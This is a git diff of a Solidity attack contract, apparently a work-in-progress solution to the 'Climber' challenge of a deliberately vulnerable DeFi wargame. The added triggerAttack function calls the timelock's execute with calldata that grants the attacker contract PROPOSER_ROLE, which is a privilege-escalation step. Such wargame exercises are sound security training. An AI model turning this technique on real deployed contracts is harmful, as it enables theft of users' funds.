@@ -1,17 +1,12 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity ^0.8.0;
+import "@openzeppelin/contracts/utils/Address.sol";
 
-import "../the-rewarder/FlashLoanerPool.sol";
-import "../the-rewarder/TheRewarderPool.sol";
-import "../the-rewarder/RewardToken.sol";
-import "../the-rewarder/AccountingToken.sol";
-import "../DamnValuableToken.sol";
+pragma solidity ^0.8.0;
 
 interface ITimelock {
     function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external payable;
-    function updateDelay(uint64 newDelay) external;
-
+    function updateDelay(uint64 newDelay) external; // just for testing connection
 }
 
 contract ClimberAttack {
@@ -29,7 +24,22 @@ contract ClimberAttack {
 
     function triggerAttack() external {
         require(msg.sender == owner, "Only owner allowed");
-        timelock.updateDelay(10);
+
+        address[] memory _addresses = new address[](1);
+        _addresses[0] = address(timelock);
+
+        uint256[] memory _values = new uint256[](1);
+        _values[0] = 0;
+
+        bytes[] memory _dataElements = new bytes[](1);
+        _dataElements[0] = abi.encodeWithSignature("_setupRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
+
+        timelock.execute(
+            _addresses, // address[] calldata targets 
+            _values, // uint256[] calldata values
+            _dataElements, // bytes[] calldata dataElements
+            bytes32(bytes("salty")) //bytes32 salt
+        );
     }
 
 }
